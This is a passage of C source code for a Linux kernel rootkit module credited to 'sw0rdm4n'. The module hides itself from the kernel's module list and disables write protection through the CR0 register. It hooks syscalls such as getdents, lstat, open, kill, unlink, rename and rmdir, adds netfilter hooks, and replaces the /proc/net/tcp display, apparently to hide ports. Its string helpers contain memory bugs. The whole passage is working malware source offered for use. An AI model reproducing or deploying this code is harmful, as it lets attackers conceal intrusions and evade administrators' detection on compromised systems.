	seq_printf(f, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X %02X:%08lX "
			"%08X %5d %8d %lu %d %p %lu %lu %u %u %d",
		i, src, srcp, dest, destp, sk->sk_state,
		tp->write_seq - tp->snd_una,
		rx_queue,
		timer_active,
		jiffies_to_clock_t(timer_expires - jiffies),
		icsk->icsk_retransmits,
		sock_i_uid(sk),
		icsk->icsk_probes_out,
		sock_i_ino(sk),
		atomic_read(&sk->sk_refcnt), sk,
		jiffies_to_clock_t(icsk->icsk_rto),
		jiffies_to_clock_t(icsk->icsk_ack.ato),
		(icsk->icsk_ack.quick << 1) | icsk->icsk_ack.pingpong,
		tp->snd_cwnd,
		tcp_in_initial_slowstart(tp) ? -1 : tp->snd_ssthresh);
			#endif
		#endif
}

#endif /* eof #if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,25)) */

static int rk_tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct tcp_iter_state *st;
	#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,25))	
	char tmpbuf[TMPSZ + 1];
	#else
	int len;
	#endif
	
	if (v == SEQ_START_TOKEN) {
		seq_printf(seq, "%-*s\n", TMPSZ - 1,
			   "  sl  local_address rem_address   st tx_queue "
			   "rx_queue tr tm->when retrnsmt   uid  timeout "
			   "inode");
		goto out;
	}
	st = seq->private;
	switch (st->state) {
	case TCP_SEQ_STATE_LISTENING:
		#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,25))	
		_rk_get_tcp4_sock(v, tmpbuf, st->num);
		#else
		rk_get_tcp4_sock(v, seq, st->num, &len);
		#endif
		break;
	case TCP_SEQ_STATE_ESTABLISHED:
		#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,25))	
		_rk_get_tcp4_sock(v, tmpbuf, st->num);
		#else
		rk_get_tcp4_sock(v, seq, st->num, &len);
		#endif
		break;
	case TCP_SEQ_STATE_OPENREQ:
		#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,25))	
		_rk_get_openreq4(st->syn_wait_sk, v, tmpbuf, st->num, st->uid);
		#else
		rk_get_openreq4(st->syn_wait_sk, v, seq, st->num, st->uid, &len);
		#endif
		break;
	#if(LINUX_VERSION_CODE <= KERNEL_VERSION(3,12,0))
	case TCP_SEQ_STATE_TIME_WAIT:
		#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,25))	
		_rk_get_timewait4_sock(v, tmpbuf, st->num);
		#else
		rk_get_timewait4_sock(v, seq, st->num, &len);
		#endif
		break;
	#endif
	}
	/*
	#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,25))	
	seq_printf(seq, "%-*s\n", TMPSZ - 1, tmpbuf);
	#else
	seq_printf(seq, "%*s\n", TMPSZ - 1 - len, "");
	#endif
	*/
out:
	return 0;
}
#endif

/* eof modified functions from original linux kernel source codes */

/* string trimming functions modified for kernel space usability from userspace functions at http://en.wikipedia.org/wiki/Trimming_%28computer_programming%29#C.2FC.2B.2B */

static inline char *rtrim(char *str)
{
	int n = 0;
	char *ret_str = NULL;
	
	if (str == NULL) {
		ret_str = "X";
		goto out_rtrim;
	}
	n = (int)strlen(str);
	while (n > 0 && isspace((unsigned char)str[n - 1])) 
		n--;
	str[n] = '\0';
	if (str != NULL) {
		ret_str = n_kmalloc(strlen(str));
		strncpy(ret_str, str, strlen(str));
	}
	if (ret_str == NULL) 
		return (char *)'\0';
	out_rtrim:
	
	return ret_str;
}
 
static inline char *ltrim(char *str)
{
	char *ret_str = NULL;
	int n = 0;
	
	if (str == NULL) {
		ret_str = "X";
		goto out_ltrim;
	}
	ret_str = n_kmalloc(strlen(str));
	strncpy(ret_str, str, strlen(str));
	while (str[n] != '\0' && isspace((unsigned char)str[n])) 
		n++;
	memmove(ret_str, str + n, strlen(str) - n + 1);
	if (ret_str == NULL)
		return (char *)'\0';
	out_ltrim:
	
	return ret_str;
}
 
static inline char *trim(char *str)
{
	char *ret_str = NULL, *bef_ret = NULL, *final_ret = NULL;
	
	if (str != NULL) {
		if ((str[0] != '\0') && (str[0] != '\x00')) {
			if (sizeof(str) > 0) {
				ret_str = rtrim(str);
				bef_ret = ltrim(ret_str);
			}
		}
		if (bef_ret != NULL) 
			final_ret = bef_ret;
		else {
			final_ret = n_kmalloc(strlen(str));
			strncpy(final_ret, str, strlen(str));
		}
	}
	else 
		return (char *)'\0';
	if (final_ret == NULL)
		return (char *)'\0';
		
	return final_ret;
}

/* atoi function taken from http://vicenza.linux.it/pipermail/lugvi-fans/2001-January/000249.html */
static inline int atoi(char *str)
{
        int res = 0, i;
        for (i = 0; str[i] >= '0' && str[i] <= '9'; ++i)
                res = 10 * res + str[i] - '0';
        return res;
}

static int cr_start(void)
{
	list_del (&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	try_module_get(THIS_MODULE); 
	/* registering netfilter hook */
	_netfilter_hooks_init();	
	/* modify 16th bit (wp) at cr0 register */
	cr();
	/* saving original pointer to syscall */	
	#if defined(__x86_64__) || defined(__amd64__)
	lstat_asli = (void *) (proto_sys_call[__NR_lstat]);
	#endif	
	#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__)  
	lstat64_asli = (void *) (proto_sys_call[__NR_lstat64]);
	#endif	
	#if defined(__x86_64__) || defined(__amd64__)
	getdents_asli = (void *) (proto_sys_call[__NR_getdents]);
	#endif	
	#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__)  
	getdents64_asli = (void *) (proto_sys_call[__NR_getdents64]);
	#endif	
	#if (LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,18))
	unlinkat_asli = (void *) (proto_sys_call[__NR_unlinkat]);	
	#endif
	#if (LINUX_VERSION_CODE < KERNEL_VERSION(2,6,18))
	unlink_asli = (void *) (proto_sys_call[__NR_unlink]);	
	#endif
	rename_asli = (void *) (proto_sys_call[__NR_rename]);
	rmdir_asli = (void *) (proto_sys_call[__NR_rmdir]);
	open_asli = (void *) (proto_sys_call[__NR_open]);	
	kill_asli = (void *) (proto_sys_call[__NR_kill]);	
	chdir_asli= (void *) (proto_sys_call[__NR_chdir]);
	dup_asli = (void *) (proto_sys_call[__NR_dup]);
	/* replace original pointers with hook functions */
	#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__) 		
		proto_sys_call[__NR_lstat64] = (long) *(cr_lstat64);
	#endif	
	#if defined(__x86_64__) || defined(__amd64__)	
		proto_sys_call[__NR_lstat] = (long) *(cr_lstat);
	#endif

	#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__) 		
		proto_sys_call[__NR_getdents64] = (long) *(cr_getdents64);
	#endif	
	#if defined(__x86_64__) || defined(__amd64__)	
		proto_sys_call[__NR_getdents] = (long) *(cr_getdents);
	#endif
	#if (LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,18))
	proto_sys_call[__NR_unlinkat] = (long) *(cr_unlinkat);		
	#endif
	#if (LINUX_VERSION_CODE < KERNEL_VERSION(2,6,18))
	proto_sys_call[__NR_unlink] = (long) *(cr_unlink);		
	#endif
	proto_sys_call[__NR_kill] = (long) *(cr_kill);
	proto_sys_call[__NR_open] = (long) *(cr_open);	
	proto_sys_call[__NR_rmdir] = (long) *(cr_rmdir);
	proto_sys_call[__NR_rename] = (long) *(cr_rename);	
	proto_sys_call[__NR_chdir] = (long) *(cr_chdir);
	proto_sys_call[__NR_dup] = (long) *(cr_dup);
	cr();

	return 0;
}

static void cr_end(void)
{
	/* haven't check exact version */
	#if (LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0))
	struct tcp_seq_afinfo *_afinfo = NULL;
	#endif

	#if(LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,24))
		#if (LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0))
        struct proc_dir_entry *_dir_entry = init_net.proc_net->subdir;
		#endif
	#else
        struct proc_dir_entry *_dir_entry = proc_net->subdir;
	#endif
	/* netfilter cleanup */
	_netfilter_hooks_cleanup();
	/* modify 16th bit (wp) at cr0 register */
	cr();
	/* restore back original pointers */
	#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__)  
	proto_sys_call[__NR_lstat64] = (long) *(lstat64_asli);
	#endif	
	#if defined(__x86_64__) || defined(__amd64__)			
	proto_sys_call[__NR_lstat] = (long) *(lstat_asli);	
	#endif
	#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__) 
	proto_sys_call[__NR_getdents64] = (long) *(getdents64_asli);
	#endif	
	#if defined(__x86_64__) || defined(__amd64__)			
	proto_sys_call[__NR_getdents] = (long) *(getdents_asli);	
	#endif
	#if (LINUX_VERSION_CODE < KERNEL_VERSION(2,6,18))	
	proto_sys_call[__NR_unlink] = (long) *(unlink_asli);
	#endif
	#if (LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,18))	
	proto_sys_call[__NR_unlinkat] = (long) *(unlinkat_asli);
	#endif	
	proto_sys_call[__NR_rmdir] = (long) *(rmdir_asli);
	proto_sys_call[__NR_rename] = (long) *(rename_asli);
	proto_sys_call[__NR_kill]  = (long)  *(kill_asli);
	proto_sys_call[__NR_open] = (long) *(open_asli);
	proto_sys_call[__NR_chdir] = (long) *(chdir_asli);	
	proto_sys_call[__NR_dup] = (long) *(dup_asli);
	/* eof restore back original pointers */	
	cr();
	if (_hook_net == 1 && should_i_hide_port == 1) {
		/* searching trick from ad0re */
		#if (LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0))	
		while (strcmp(_dir_entry->name, "tcp"))
        		_dir_entry = _dir_entry->next;
      		if ((_afinfo = (struct tcp_seq_afinfo*)_dir_entry->data)) {
			#if(LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,26))   
			_afinfo->seq_ops.show = real_tcp4_seq_show;	
			#else      
			_afinfo->seq_show = real_tcp4_seq_show;
			#endif
		}
		#endif
  	}
}

module_init(cr_start);
module_exit(cr_end);
MODULE_AUTHOR("sw0rdm4n");
MODULE_LICENSE("GPL");
